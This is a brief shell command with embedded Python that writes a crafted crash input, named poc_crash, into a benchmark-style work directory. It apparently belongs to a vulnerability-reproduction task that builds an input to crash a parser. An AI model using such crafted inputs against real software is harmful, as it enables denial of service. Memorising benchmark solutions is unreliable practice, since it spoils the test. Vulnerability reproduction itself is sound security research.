cd /tmp && python3 - <<'PYEOF'
sep=b'\\\n'
data=(0x200).to_bytes(4,'little')+b'<c/>'+sep+b'<a>'
open('/CybinGym_workdir/poc_crash','wb').write(data)
print("wrote /CybinGym_workdir/poc_crash:", data)
PYEOF
